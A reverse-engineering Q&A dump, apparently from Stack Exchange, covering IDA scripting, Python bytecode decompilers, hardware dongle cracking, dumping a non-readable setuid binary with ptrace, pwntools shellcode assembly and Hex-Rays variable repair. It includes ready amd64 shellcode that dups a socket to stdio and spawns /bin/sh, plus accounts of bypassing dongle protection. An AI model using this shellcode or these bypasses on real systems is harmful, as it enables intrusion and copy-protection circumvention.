        # and to that I say CBA aka left as an exercise to the reader
        idaapi.set_segm_start(ea, SegStart(ea)+4, 0)
        # expanding it's new segment
        idaapi.set_segm_end(ea-1, SegEnd(ea-1)+4, 0)
    else:
        print(""Creating new segment for import"")
        idc.AddSeg(ea, ea+4, 0, 1, 4, 0)
        idc.SetSegClass(ea, ""XTRN"")

    # renaming import to API name. This will make IDA add type
    # information and automatic comments for any function it's
    # familiar with
    idc.MakeName(ea, import_name)
    # Making it an offset to have IDA show it as an import instead
    # of hiding it
    idc.MakeDword(ea)
</code></pre>
","2154"
"What are the tools to analyze Python (obfuscated) bytecode?","5920","","<p>Recently on <a href=""http://www.reddit.com/r/ReverseEngineering"" rel=""noreferrer"">Reddit ReverseEngineering</a> I stumbled on a <a href=""http://www.reddit.com/r/ReverseEngineering/comments/1da222/selfmodifying_python_bytecode/"" rel=""noreferrer"">self-modifying code in Python</a>. Looking at the <a href=""https://github.com/0vercl0k/stuffz/tree/master/Python%27s%20internals"" rel=""noreferrer"">Github</a> repository was quite instructive and I found picture of the Python bytecode program exposed in CFG form:</p>

<p><img src=""https://i.stack.imgur.com/TKeQM.png"" alt=""enter image description here""></p>

<p>I am wondering if there are tools to perform static analysis on Python bytecode program with some nice features (such as generating the CFG or allowing to manipulate the code, ...) ?</p>
","<p>There are several tools dedicated to Python's bytecode reversing:</p>

<ul>
<li><p><a href=""https://github.com/gstarnberger/uncompyle"" rel=""nofollow noreferrer"">Uncompyle</a> and <a href=""https://github.com/fry/uncompyle2"" rel=""nofollow noreferrer"">Uncompyle2</a></p>

<blockquote>
  <p>'uncompyle' converts Python byte-code back into equivalent Python
  source. It accepts byte-code from Python version 2.7 only. The generated source is very readable: docstrings, lists, tuples and hashes get pretty-printed. </p>
  
  <p>'uncompyle' may also verify the equivalence of the generated source by
  by compiling it and comparing both byte-codes.
  'uncompyle' is based on John Aycock's generic small languages compiler
  '<a href=""http://www.csr.uvic.ca/~aycock/python/"" rel=""nofollow noreferrer"">spark</a>' and his prior work on
  'decompyle'.</p>
</blockquote></li>
<li><p><a href=""https://github.com/MyNameIsMeerkat/pyREtic"" rel=""nofollow noreferrer"">pyREtic</a>, that is more a powerful framework than a simple program</p>

<blockquote>
  <p>pyREtic is an extensible framework to assist in performing various reverse engineering tasks for Python language projects. It assists a reverse engineer in gaining sourcecode (.py's) back from bytecode (.pyc's), in particular it assists when the code that is being reversed has put some effort into trying to stop decompilation using standard toolsets.</p>
</blockquote></li>
<li><p><a href=""https://github.com/zrax/pycdc"" rel=""nofollow noreferrer"">pycdc</a>, which works better than uncompyle, and is simpler to use than pyRetic</p>

<blockquote>
  <p>Decompyle++ aims to translate compiled Python byte-code back into valid and human-readable Python source code. While other projects have achieved this with varied success, Decompyle++ is unique in that it seeks to support byte-code from any version of Python.</p>
  
  <p>Decompyle++ includes both a byte-code disassembler (pycdas) and a decompiler (pycdc).</p>
</blockquote></li>
<li><p>The <a href=""https://bitbucket.org/larry/maynard"" rel=""nofollow noreferrer"">Manyard</a> framework, which is dedicated to Python3</p></li>
</ul>
","2960"
"Are hardware dongles able to protect your software?","5919","","<p>Various software companies distribute their software with hardware security, usually a dongle which must be mounted in order for the software to operate.</p>

<p>I don't have experience with them, but I wonder, do they really work?</p>

<p>What is it that the dongle actually does?  I think that the only way to enforce security using this method, and prevent emulation of the hardware, the hardware has to perform some important function of the software, perhaps implement some algorithm, etc.</p>
","<p>Clearly Peter has addressed the main points of proper implementation. Given that I have - without publishing the results - ""cracked"" two different dongle systems in the past, I'd like to share my insights as well. user276 already hints, in part, at what the problem is.</p>

<p>Many software vendors think that they purchase some kind of security for their licensing model when licensing a dongle system. They couldn't be further from the truth. All they do is to get the tools that allow them to implement a relatively secure system (within the boundaries pointed out in Peters answer).</p>

<p>What is the problem with copy protection in general? If a software uses mathematically sound encryption for its licensing scheme this has no bearing on the security of the copy protection as such. Why? Well, you end up in a catch 22 situation. You don't trust the user (because the user could copy the software), so you encrypt stuff or use encryption somehow in your copy protection scheme. Alas, you need to have your private key in the product to use the encryption, which completely contradicts the notion of mistrusting the user. Dongles try to put the private key (and/or algorithm and/or other ingredients) into hardware such that the user has no access in the first place.</p>

<p>However, since many vendors are under the impression that they purchase security out of the box, they don't put effort into the correct implementation. Which brings me to the first example. It's a CAD program my mother was using. Out of the knowledge that dongles connecting to LPT tend to fail more often than their more recent USB counterparts, I set out to ""work around"" this one. That was around 2005.</p>

<p>It didn't take me too long. In fact I used a simple DLL placement attack (the name under which the scenario later became known) to inject my code. And that code wasn't all too elaborate. Only one particular function returned the value the dongle would usually read out (serial number), and that was it. The rest of the functions I would pass through to the original DLL which the dongle vendor requires to be installed along with the driver.</p>

<p>The other dongle was a little before that. The problem here was that I was working for a subcontractor and we had limited access only to the software for which we were supposed to develop. It truly was a matter of bureaucracy between the company that licensed the software and the software vendor, but it caused major troubles for us. In this case it was a little more challenging to work around the dongle. First of all a driver had to be written to sniff the IRPs from and to the device. Then the algorithm used for encryption had to be found out. Luckily not all was done in hardware which provided the loop hole for us. In the end we had a little driver that would pose as the dongle. Its functionality was extended so far as to read out a real dongle, save the data (actually pass it to a user mode program saving it) and then load it back to pose as this dongle.</p>

<p><strong>Conclusion:</strong> dongles, no matter which kind, if they <em>implement</em> core functionality of the program to which they belong will be hard to crack. For everything else it mostly depends on the determination and willingness to put in time of the person(s) that set out to work around the dongle.
As such I would say that dongles pose a considerable hindrance - if implemented correctly - but in cases of negligence on part of the software vendor seeking to protect his creation also mere snake oil.</p>

<p>Take heed from the very last paragraph in Peters answer. But I would like to add one more thought. Software that is truly worth the effort of being protected, because it is unique in a sense, shouldn't be protected on the basis of customer harassment (== most copy protection schemes). Instead consider the example of IDA Pro, which can certainly be considered pretty unique software. They watermark the software to be able to track down the person that leaked a particular bundle. Of course, as we saw with the ESET leak, this doesn't help always, but it creates <a href=""https://www.hex-rays.com/products/ida/support/hallofshame/index.shtml"">deterrence</a>. It'll be less likely that a cracker group gets their hands on a copy, for example.</p>
","247"
"How can I analyse an executable with no read permission?","5864","","<p>I have a binary on a Linux (Kernel 2.6) which I can execute, but can't read (chmod 0711). Therefore no static analysis is possible.</p>

<pre><code>user1: $ ls -l bin 
-r-s--x--- user2 user1 bin
user1: $ file bin
setuid executable, regular file, no read permission
</code></pre>

<p>I'm looking for different dynamic techniques to gather as much information as possible.</p>

<p>For example <code>strace</code> works with this executable.</p>

<hr>

<p>UPDATE : I was able to resolve the issue. <a href=""https://reverseengineering.stackexchange.com/a/110"">See answer.</a></p>

<p>Thank you all &lt;3 this new reverseengineering community rocks!</p>
","<p>I initially thought you wouldn't be able to dump the program, but it turns out that you can — see the second section of this answer.</p>

<h2>Running the program</h2>

<p>Most of the usual methods won't work because the executable is setuid. If you start the program normally, it runs with elevated privileges (euid ≠ ruid), and most debugging facilities are reserved to root. For example, anything that relies on attaching to the program with <code>ptrace</code> is reserved to root. This includes just about anything you could do in a debugger. Linux lets you dump the memory of a running process (with <code>ptrace</code> or through <a href=""https://unix.stackexchange.com/questions/6301/how-do-i-read-from-proc-pid-mem-under-linux""><code>/proc/$pid/maps</code> and <code>/proc/$pid/mem</code></a>), but that too is disabled for a setuid executable.</p>

<p>You can run <code>strace ./bin</code>, and see what system calls the program makes. However, this runs the program without any extra privileges. It may well stop early and complain that it can't read a file, or that it isn't running as the right user.</p>

<p>You can see statistics like CPU usage, IO usage, network usage, memory usage, etc. in <code>/proc/$pid</code>: files like <code>status</code>, <code>sched</code> and <code>net/netstat</code> are world-readable (whether the program is actually started with extra privileges or not, the setuid restrictions apply). The one interesting thing I see is the program's network connections. The really juicy stuff, like memory contents (<code>mem</code>) and even open files (<code>fd</code>) is disabled either way. Preloading a library with <code>LD_PRELOAD</code> or running the program with a different <code>LD_LIBRARY_PATH</code> is also disabled either way. Nor will you get a core dump.</p>

<p>So what works? You can see open network connections, maybe one of them will give you a clue or will be spoofable. You can try to figure out what files the program accesses by modifying them when you can, or by running the program from another directory (try making a symbolic link).</p>

<p>If you have access to a chroot jail on the machine, try running the program from there. If you can run a virtual machine which implements shared folders (e.g. VMware or VirtualBox), see if you can access the program from there. This is all about subverting the security of the system: the permissions are designed to hinder you in your task.</p>

<p>An advanced technique is to observe the program under heavy load and try to deduce what it does from the time it takes. Pollute the disk caches and see what files become quickly accessible. See how the swap usage varies depending on what the program does (so you get an idea of how many different pages are in its working set, not just how much total memory it's using). A lot of trial and error will be required. When you know the code and are trying to obtain the data, this is a well-known side channel attack. When you don't know the code, I expect it to be very difficult to obtain useful information this way.</p>

<h2>Dumping the memory contents</h2>

<p>I initially thought you couldn't dump the memory of the program because of the setuid bit (which usually wouldn't be a problem because you'd just copy the executable, but here this isn't possible because the executable is not readable). This turns out to be wrong. If you attach to the program with <code>ptrace</code> before calling <code>execve</code> (like running <code>strace ./bin</code> does), you do have access to <code>ptrace</code> in all its glory, including <code>PTRACE_PEEKDATA</code> and <code>PTRACE_PEEKEXEC</code>. That doesn't run the program setuid, so it may behave differently, but the code and static data loaded into memory are the same either way.</p>

<p>Kudos to <a href=""https://reverseengineering.stackexchange.com/questions/98/how-can-i-analyse-an-executable-with-no-read-permission/110#110"">samuirai</a> for pointing this out.</p>

<p>Here's an overview of how you can dump the program's memory:</p>

<ul>
<li>Fork, and call <code>ptrace(PTRACE_TRACEME, ...)</code> in the child then execute the program (<code>execl(""./bin"", ""./bin"", NULL)</code>).</li>
<li>In the parent, call <code>waitpid</code> to wait for the child to return from <code>execve</code>.</li>
<li>Figure out the address at which the code is loaded. The value of the IP register (obtained through <code>PTRACE_GETREGS</code>) should give a clue, and you can look for file format headers.</li>
<li>Read the child's memory word by word (<code>PTRACE_PEEKTEXT</code>, <code>PTRACE_PEEKDATA</code>).</li>
<li>Reconstruct the file format (e.g. make an ELF binary from text and data sections) if needed. Dump out the data into a file.</li>
<li>Kill the child — it won't even get to execute anything.</li>
</ul>

<p><a href=""https://reverseengineering.stackexchange.com/questions/98/how-can-i-analyse-an-executable-with-no-read-permission/150#150"">Dougall pointed out a working proof-of-concept tool</a> for ELF executables: <a href=""http://reverse.lostrealm.com/tools/xocopy.html"" rel=""nofollow noreferrer"">xocopy</a>.</p>
","106"
"Python lib for assembling x86, x64 and ARM exploits","5858","","<p>It would be very useful to have a pure python library that could assemble x86, x64 and ARM instructions. Do you have any recommendations?</p>

<p>I don't mind if they are not pure-python, but that'd be preferred, thanks!</p>
","<p>Take a look at Gallopsled's pwntools.  Does all the things you want it to, and has most of it built in already.</p>

<p><a href=""https://github.com/Gallopsled/pwntools"" rel=""nofollow noreferrer"">https://github.com/Gallopsled/pwntools</a></p>

<p>For a few examples of it in use, I put up some <a href=""https://gist.github.com/ebeip90"" rel=""nofollow noreferrer"">writeups from Codegate 2013</a> and the <a href=""http://pwnies.dk/"" rel=""nofollow noreferrer"">pwnies do their own writeups</a> as well.</p>

<p>Here's a quick example of ""I want to <code>dup</code> file descriptor #4 (e.g. a connected TCP socket) to stdin/stdout/stderr, and pop a shell"".</p>

<pre><code>#!/usr/bin/env python
from pwn import *
context.arch = 'amd64' # Default architecture is i386

shellcode = shellcraft.dupio(4) + shellcraft.sh()
print shellcode
print '----'
print enhex(asm(shellcode))
print '----'
print hexdump(asm(shellcode))
</code></pre>

<p>Prints out</p>

<pre><code>dup_1:
    push 4
    pop rbp

    push 3
loop_2:
    pop rsi
    dec rsi
    js after_3
    push rsi

    /* call dup2('rbp', 'rsi') */
    push SYS_dup2 /* 0x21 */
    pop rax
    mov rdi, rbp
    syscall

    jmp loop_2
after_3:
    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
    /* push '/bin///sh\x00' */
    push 0x68
    mov rax, 0x732f2f2f6e69622f
    push rax
    mov rdi, rsp
    /* push argument array ['sh\x00'] */
    /* push 'sh\x00' */
    push 0x1010101 ^ 0x6873
    xor dword ptr [rsp], 0x1010101
    xor esi, esi /* 0 */
    push rsi /* null terminate */
    push 8
    pop rsi
    add rsi, rsp
    push rsi /* 'sh\x00' */
    mov rsi, rsp
    xor edx, edx /* 0 */
    /* call execve() */
    push SYS_execve /* 0x3b */
    pop rax
    syscall

----
6a045d6a035e48ffce780b566a21584889ef0f05ebef6a6848b82f62696e2f2f2f73504889e768726901018134240101010131f6566a085e4801e6564889e631d26a3b580f05
----
00000000  6a 04 5d 6a  03 5e 48 ff  ce 78 0b 56  6a 21 58 48  │j·]j│·^H·│·x·V│j!XH│
00000010  89 ef 0f 05  eb ef 6a 68  48 b8 2f 62  69 6e 2f 2f  │····│··jh│H·/b│in//│
00000020  2f 73 50 48  89 e7 68 72  69 01 01 81  34 24 01 01  │/sPH│··hr│i···│4$··│
00000030  01 01 31 f6  56 6a 08 5e  48 01 e6 56  48 89 e6 31  │··1·│Vj·^│H··V│H··1│
00000040  d2 6a 3b 58  0f 05                                  │·j;X│··│
00000046
0490a0e30280a0e30900a0e10810a0e13f0090ef018058e2faffff5a0c008fe20020a0e305002de90d10a0e10b0090ef2f62696e2f736800
0000a0e31eff2fe1
</code></pre>

<p>They've also got nifty command-line tools for testing shellcode.  For example:</p>

<pre><code>$ pwn shellcraft i386.linux.echo ""Hello world""
6801010101813424736d6501686f20776f6848656c6c6a04586a015b89e16a0b5acd80
</code></pre>

<p>If you pipe it to a file or another program, raw binary is sent.</p>

<pre><code>$ pwn shellcraft i386.linux.echo ""Hello world"" | xxd
00000000: 6801 0101 0181 3424 736d 6501 686f 2077  h.....4$sme.ho w
00000010: 6f68 4865 6c6c 6a04 586a 015b 89e1 6a0b  ohHellj.Xj.[..j.
00000020: 5acd 80                                  Z..
</code></pre>

<p>You can print out the raw annotated assembly:</p>

<pre><code>$ pwn shellcraft i386.linux.echo ""Hello world"" -f asm
/* push 'Hello world' */
push 0x1010101
xor dword ptr [esp], 0x1656d73
push 0x6f77206f
push 0x6c6c6548
/* call write('1', 'esp', 0xb) */
push SYS_write /* 4 */
pop eax
push (1) /* 1 */
pop ebx
mov ecx, esp
push 0xb
pop edx
int 0x80
</code></pre>

<p>Or generate an ELF:</p>

<pre><code>$ pwn shellcraft i386.linux.echo ""Hello world"" --format elf &gt; hello
$ file hello
hello: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped 
</code></pre>

<p>And even automatically execute or debug it:</p>

<pre><code>$ pwn shellcraft ... --run
$ pwn shellcraft ... --debug
</code></pre>

<p>You can also assemble your own shellcode on the command-line:</p>

<pre><code>$ pwn asm nop
90
$ pwn asm nop | xxd
00000000: 90                                       .
</code></pre>
","5857"
"IDA PRO repairing stack variables / local variables hex-rays with arrays and proper types / structures any scripts/plugins?","5783","","<p>IDA PRO's Hex-Ray gives me these variables.</p>

<pre><code>  void *v7; // esp@1
  const char *v8; // ebx@1
  PLAYER *v9; // ebp@1
  int v10; // edi@5
  PLAYER *v11; // edx@6
  int v12; // ecx@9
  int v13; // esi@17
  int v14; // eax@33
  const char v15; // al@36
  const char *v16; // ebx@45
  PLAYER *v17; // eax@50
  int v18; // esi@51
  const CHAR *v19; // ecx@54
  int v20; // edx@56
  unsigned int v21; // eax@61
  signed int v22; // ebx@61
  ARENA *v23; // eax@63
  ARENA *v24; // edx@63
  int v25; // ecx@63
  int v26; // esi@64
  signed int v27; // edi@65
  int v28; // eax@66
  ARENA *v29; // ecx@66
  int v30; // esi@69
  int v31; // edi@71
  int v32; // esi@71
  signed int v33; // ecx@74
  int v34; // eax@75
  const CHAR *v35; // edi@78
  signed int v36; // ecx@78
  signed int v37; // ecx@81
  const void *v38; // esi@81
  const CHAR *v39; // edi@81
  unsigned int v40; // edx@81
  signed int v41; // ecx@81
  const char v42; // al@89
  const char *v43; // ebx@89
  const char v44; // al@90
  const char v45; // al@96
  const char *v46; // ebx@96
  const char v47; // al@97
  const char v48; // al@103
  const char *v49; // ebx@103
  const char v50; // al@104
  int v51; // ebx@107
  const char *v52; // edx@108
  unsigned int v53; // kr48_4@108
  unsigned int v54; // kr50_4@108
  const char *v55; // edi@108
  unsigned int v56; // kr58_4@110
  const char *v57; // esi@110
  const char *v58; // edi@110
  int v59; // ecx@110
  bool v60; // zf@110
  int v61; // edi@121
  int i; // esi@121
  const char *v63; // eax@122
  signed int v64; // esi@126
  const char *v65; // ebx@134
  PLAYER *v66; // eax@140
  int v67; // edx@141
  int v68; // ecx@141
  PLAYER *v69; // eax@146
  int v70; // edx@147
  int v71; // ecx@147
  const CHAR v72; // cl@153
  int v73; // eax@153
  const CHAR *j; // edx@153
  char v75; // cl@156
  const CHAR v76; // cl@157
  int v77; // eax@157
  const CHAR *k; // edx@157
  char v79; // cl@160
  const CHAR v80; // cl@161
  int v81; // eax@161
  const CHAR *l; // edx@161
  char *v83; // eax@163
  const CHAR v84; // al@171
  int v85; // esi@171
  const CHAR *m; // ecx@171
  char v87; // al@174
  const CHAR v88; // al@175
  int v89; // esi@175
  const CHAR *n; // ecx@175
  const CHAR v91; // al@180
  int v92; // esi@180
  const CHAR *ii; // ecx@180
  const char *v94; // ebx@189
  const char v95; // al@200
  const char *v96; // ebx@200
  const char v97; // al@201
  ARENA *v98; // eax@204
  unsigned int v99; // kr68_4@208
  int v100; // edi@208
  PLAYER **v101; // ebx@209
  int v102; // ebx@215
  PLAYER *v103; // ecx@217
  __int64 v104; // qax@218
  int v105; // ecx@218
  __int64 v106; // qax@218
  int v107; // ST24_4@218
  __int64 v108; // qax@218
  PLAYER *v109; // esi@223
  int v110; // ST24_4@224
  int v111; // ST1C_4@224
  int v112; // ST18_4@224
  char *v113; // eax@224
  ARENA *v114; // eax@226
  signed int v115; // ecx@228
  int v116; // eax@228
  ENCRYPTION *v117; // ecx@230
  int v118; // edi@230
  int v119; // edx@233
  int v120; // edi@233
  unsigned __int64 v121; // st7@233
  DWORD v122; // eax@235
  int v123; // ecx@235
  DWORD v124; // eax@237
  unsigned __int64 v125; // st7@237
  int v126; // ecx@237
  int v127; // edx@239
  DWORD v128; // edi@239
  time_t v129; // ST20_8@242
  signed __int64 v130; // qax@242
  signed int v131; // edi@242
  __int64 v132; // qax@243
  __int64 v133; // ST20_8@243
  signed int v134; // ecx@243
  __int64 v135; // ST18_8@243
  int v136; // ecx@247
  PLAYER *v137; // eax@268
  int v138; // ecx@269
  const char v139; // al@276
  const char *v140; // edi@276
  const char v141; // al@277
  const char v142; // al@279
  __int16 v143; // ax@284
  PLAYER *v144; // edi@289
  ARENA *v145; // eax@292
  int v146; // ecx@292
  signed int v147; // edx@293
  PLAYER *v148; // eax@294
  ARENA *v149; // eax@296
  int v150; // ecx@296
  signed int v151; // edx@297
  PLAYER *v152; // eax@298
  PLAYER *v153; // eax@308
  char *v154; // eax@309
  const char v155; // al@312
  const char *v156; // edi@312
  const char v157; // al@313
  ARENA *v158; // eax@318
  unsigned int v159; // kr88_4@320
  const char v160; // al@323
  const char *v161; // edi@323
  const char v162; // al@324
  const char v163; // al@330
  const char *v164; // edi@330
  const char v165; // al@331
  int v166; // eax@336
  __int16 v167; // ax@342
  PLAYER *v168; // esi@346
  int v169; // edx@350
  const char v170; // al@384
  const char *v171; // edi@384
  const char v172; // al@385
  PLAYER *v173; // esi@392
  int v174; // edx@397
  PLAYER *v175; // esi@403
  int v176; // edi@408
  int v177; // eax@409
  int v178; // esi@410
  int v179; // eax@410
  ARENA *v180; // ecx@413
  int v181; // edi@415
  ARENA **v182; // esi@416
  PLAYER *v183; // ecx@423
  int v184; // edi@427
  PLAYER **v185; // esi@428
  PLAYER *v186; // ecx@437
  ARENA *v187; // ecx@443
  FILE *v188; // eax@449
  const char *v189; // edi@449
  int v190; // ebx@451
  int v191; // eax@451
  FILE *v192; // eax@454
  ARENA *v193; // eax@455
  int v194; // esi@456
  signed int v195; // edi@457
  PLAYER *v196; // eax@458
  const char *v197; // esi@461
  int v198; // eax@461
  signed int v199; // edi@463
  int v200; // edx@471
  time_t v201; // ST20_8@478
  signed __int64 v202; // qax@478
  signed int v203; // esi@478
  signed int v204; // ecx@481
  int v205; // edi@481
  const char *v206; // esi@481
  bool v207; // zf@481
  const char *v208; // ebx@485
  signed int v209; // ebx@490
  char *v210; // eax@491
  int v211; // ecx@491
  int v212; // edi@494
  signed int v213; // ecx@496
  signed int v214; // ecx@499
  const void *v215; // esi@499
  const CHAR *v216; // edi@499
  unsigned int v217; // edx@499
  signed int v218; // ecx@499
  const CHAR *v219; // edi@502
  signed int v220; // ecx@502
  signed int v221; // ecx@505
  const void *v222; // esi@505
  const CHAR *v223; // edi@505
  unsigned int v224; // edx@505
  signed int v225; // ecx@505
  int v226; // ebx@516
  signed int v227; // esi@516
  ARENA *v228; // edx@520
  int v229; // eax@520
  int v230; // esi@520
  int v231; // edi@520
  int v232; // edx@520
  int v233; // ecx@524
  ARENA *v234; // eax@527
  int v235; // edx@527
  int v236; // ecx@527
  __int16 v237; // ax@527
  int v238; // eax@527
  int v239; // ecx@527
  int v240; // eax@527
  int v241; // eax@540
  ARENA *v242; // ecx@543
  char *v243; // eax@543
  char *v244; // edx@544
  char *v245; // ebx@546
  DWORD v246; // eax@546
  ARENA *v247; // esi@547
  char *v248; // esi@550
  signed int v249; // ebp@554
  int v250; // eax@557
  int v251; // eax@562
  signed int v252; // ecx@570
  int v253; // edi@570
  const char *v254; // esi@570
  bool v255; // zf@570
  int v256; // eax@575
  const char *v257; // edx@578
  ARENA *v258; // ecx@585
  signed int v259; // ebx@586
  PLAYER *v260; // ecx@587
  signed int v261; // esi@587
  __int64 v262; // qax@590
  __int64 v263; // qax@591
  int v264; // edi@602
  signed int v265; // ecx@604
  signed int v266; // ecx@607
  const void *v267; // esi@607
  const CHAR *v268; // edi@607
  unsigned int v269; // edx@607
  signed int v270; // ecx@607
  const CHAR *v271; // edi@610
  signed int v272; // ecx@610
  signed int v273; // ecx@613
  const void *v274; // esi@613
  const CHAR *v275; // edi@613
  unsigned int v276; // edx@613
  signed int v277; // ecx@613
  int v278; // edx@617
  int v279; // ecx@621
  int v280; // edx@638
  char *v281; // ebx@638
  unsigned int v282; // ebx@646
  PLAYER *v283; // eax@646
  signed int v284; // ecx@654
  signed int v285; // ecx@658
  signed int v286; // ecx@662
  signed int v287; // ecx@671
  int v288; // edi@671
  const char *v289; // esi@671
  bool v290; // zf@671
  signed int v291; // ecx@675
  int v292; // edi@675
  const char *v293; // esi@675
  bool v294; // zf@675
  signed int v295; // ecx@682
  int v296; // eax@683
  const char v297; // al@688
  const char *v298; // edi@688
  const CHAR *jj; // ecx@688
  const char v300; // al@691
  const CHAR v301; // al@692
  int v302; // edi@692
  const CHAR *kk; // ecx@692
  const char v304; // al@696
  int *v305; // edi@704
  int *v306; // esi@704
  char v307; // al@707
  int v308; // ecx@708
  int v309; // edi@708
  int v310; // esi@708
  const char *v311; // eax@709
  ARENA *v312; // edi@711
  ARENA *v313; // ecx@718
  int v314; // eax@718
  int v315; // eax@723
  __int64 v316; // qax@727
  __int64 v317; // qax@728
  __int64 v318; // qax@729
  const char *v319; // ebx@730
  int v320; // edi@737
  char *v321; // ST1C_4@737
  int v322; // esi@737
  ARENA *v323; // eax@738
  ARENA *v324; // eax@743
  DWORD v325; // eax@748
  int v326; // edx@749
  PLAYER *v327; // esi@749
  bool v328; // sf@749
  ARENA **v329; // edi@750
  ARENA *v330; // eax@751
  int v331; // ebx@751
  signed int v332; // esi@752
  unsigned int v333; // krD8_4@774
  ARENA **v334; // esi@775
  int v335; // ebp@776
  signed int v336; // edi@777
  ARENA *v337; // edx@784
  int v338; // esi@785
  int v339; // ecx@785
  const char *v340; // ecx@797
  const char v341; // al@799
  const CHAR *ll; // edx@799
  const char v343; // al@803
  const char v344; // al@804
  const char *v345; // ecx@804
  int v346; // eax@819
  int v347; // eax@833
  unsigned int v348; // krE8_4@836
  int v349; // edi@836
  PLAYER **v350; // ebp@837
  char *v351; // [sp+4h] [bp-1608Ch]@668
  const char *v352; // [sp+8h] [bp-16088h]@668
  char *v353; // [sp+Ch] [bp-16084h]@52
  char *v354; // [sp+Ch] [bp-16084h]@351
  char *v355; // [sp+Ch] [bp-16084h]@598
  char *v356; // [sp+Ch] [bp-16084h]@644
  int v357; // [sp+Ch] [bp-16084h]@668
  const char *v358; // [sp+10h] [bp-16080h]@52
  const char *v359; // [sp+10h] [bp-16080h]@57
  const char *v360; // [sp+10h] [bp-16080h]@218
  const char *v361; // [sp+10h] [bp-16080h]@351
  int v362; // [sp+10h] [bp-16080h]@525
  const char *v363; // [sp+10h] [bp-16080h]@598
  const char *v364; // [sp+10h] [bp-16080h]@644
  int v365; // [sp+10h] [bp-16080h]@668
  int v366; // [sp+14h] [bp-1607Ch]@52
  char v367; // [sp+14h] [bp-1607Ch]@54
  char v368; // [sp+14h] [bp-1607Ch]@218
  int v369; // [sp+14h] [bp-1607Ch]@351
  int v370; // [sp+14h] [bp-1607Ch]@525
  int v371; // [sp+14h] [bp-1607Ch]@598
  char *v372; // [sp+14h] [bp-1607Ch]@644
  int v373; // [sp+14h] [bp-1607Ch]@668
  time_t v374; // [sp+18h] [bp-16078h]@1
  ARENA *a5[2]; // [sp+28h] [bp-16068h]@63
  int v376; // [sp+30h] [bp-16060h]@69
  int v377; // [sp+34h] [bp-1605Ch]@61
  DWORD ExitCode; // [sp+38h] [bp-16058h]@233
  char v379; // [sp+3Fh] [bp-16051h]@420
  size_t Size; // [sp+40h] [bp-16050h]@69
  int v381; // [sp+44h] [bp-1604Ch]@233
  int v382; // [sp+48h] [bp-16048h]@69
  int v383; // [sp+4Ch] [bp-16044h]@69
  char v384; // [sp+50h] [bp-16040h]@527
  __int16 v385; // [sp+51h] [bp-1603Fh]@527
  int v386; // [sp+53h] [bp-1603Dh]@527
  int v387; // [sp+57h] [bp-16039h]@527
  __int16 v388; // [sp+5Bh] [bp-16035h]@527
  __int16 v389; // [sp+5Dh] [bp-16033h]@527
  int v390; // [sp+60h] [bp-16030h]@233
  const CHAR KeyName; // [sp+64h] [bp-1602Ch]@157
  const CHAR CommandLine; // [sp+84h] [bp-1600Ch]@52
  char v393; // [sp+85h] [bp-1600Bh]@773
  const CHAR Dest; // [sp+184h] [bp-15F0Ch]@69
  __int16 v395; // [sp+185h] [bp-15F0Bh]@342
  char v396; // [sp+187h] [bp-15F09h]@342
  const CHAR Str1; // [sp+284h] [bp-15E0Ch]@153
  const CHAR AppName; // [sp+2C4h] [bp-15DCCh]@76
  int buf; // [sp+304h] [bp-15D8Ch]@45
  char v400; // [sp+309h] [bp-15D87h]@208
  char v401; // [sp+404h] [bp-15C8Ch]@255
  char v402; // [sp+405h] [bp-15C8Bh]@255
  char v403; // [sp+414h] [bp-15C7Ch]@255
  CHAR StartupInfo[4]; // [sp+504h] [bp-15B8Ch]@163
  int v405; // [sp+510h] [bp-15B80h]@309
  char v406; // [sp+604h] [bp-15A8Ch]@741
  char v407; // [sp+605h] [bp-15A8Bh]@741
  char v408; // [sp+606h] [bp-15A8Ah]@741
  __int16 v409; // [sp+607h] [bp-15A89h]@748
  char v410; // [sp+609h] [bp-15A87h]@765
  char v411; // [sp+804h] [bp-1588Ch]@638
  char v412; // [sp+805h] [bp-1588Bh]@638
  char v413; // [sp+2804h] [bp-1388Ch]@543
  char Str; // [sp+2805h] [bp-1388Bh]@544
  char v415; // [sp+2815h] [bp-1387Bh]@546
  int v416; // [sp+16084h] [bp-Ch]@1
  int (*v417)(); // [sp+16088h] [bp-8h]@1
  int v418; // [sp+1608Ch] [bp-4h]@1
  const char *Buf1b; // [sp+160A0h] [bp+10h]@485
  const char *Buf1a; // [sp+160A0h] [bp+10h]@489
</code></pre>

<p>I was told on email by a very skilled reverser how to handle this, I don't know if he wants me to say his/her name so I'll not say anything.<br></p>

<p>But they said start doing repairs to arrays or structures starting at <code>[sp+####h]</code> and do calculations from that.</p>

<p>So the first part to start repairing is the since it begins with <code>[sp+#h]</code></p>

<pre><code>char *v351; // [sp+4h] [bp-1608Ch]@668 
</code></pre>

<p>Now you go down to</p>

<pre><code>  char *v372; // [sp+14h] [bp-1607Ch]@644
  int v373; // [sp+14h] [bp-1607Ch]@668
  time_t v374; // [sp+18h] [bp-16078h]@1
  ARENA *a5[2]; // [sp+28h] [bp-16068h]@63
  int v376; // [sp+30h] [bp-16060h]@69
</code></pre>

<p>So</p>

<pre><code>  char *v372; // [sp+14h]                                      [0]
  int v373; // [sp+14h]                     14-14 = 0 goes up  [4]
  time_t v374; // [sp+18h] [bp-16078h]@1    18-14 = 4 goes up  [16]
  ARENA *a5[2]; // [sp+28h] [bp-16068h]@63  28-18 = 16 goes up [8]
  int v376; // [sp+30h] [bp-16060h]@69      30-28 = 8 goes up  [4]
  int v377; // [sp+34h] [bp-1605Ch]@61       34-30 = 4 goes up  [ignored]
</code></pre>

<p>So <code>0</code> would mean char? yet it's a pointer to a char (4 bytes)?, Probably shouldn't touch those<br>
The <code>4</code> after would be int which seems right.<br>
The <code>16</code> after looks like <code>2 x 8 bytes</code>.<br>
Since time_t could be 4 bytes or 8 bytes.<br></p>

<p>I checked and time_t is defined as<br></p>

<pre><code>-00016080 var_16080       dd 6 dup(?)             ; offset
</code></pre>

<p>So it thinks it's 4 bytes x 6 which would be 24 bytes? why does it think that? Yes I get that <code>var_16080</code> when I click on the <code>time_t</code></p>

<p>So this is where I get confused I think it's really 8 bytes and all I have to do is make it <code>time_t v374[2]</code></p>

<p>ARENA *a5[2]; looks right 2 pointers of 4 bytes. = 8 bytes and the int after looks right.</p>

<p>Can someone tell me how what to do in certain hard cases if I have to do it all manually I would do it.. </p>

<p>But if there is a way to automate this I'd also appreciate that if anyone can tell me of a plugin or a script to do that.</p>

<p>Here is how I got it down to is it right?</p>

<pre><code>  int v369; // [sp+14h] [bp-1607Ch]@351
  int v370; // [sp+14h] [bp-1607Ch]@525
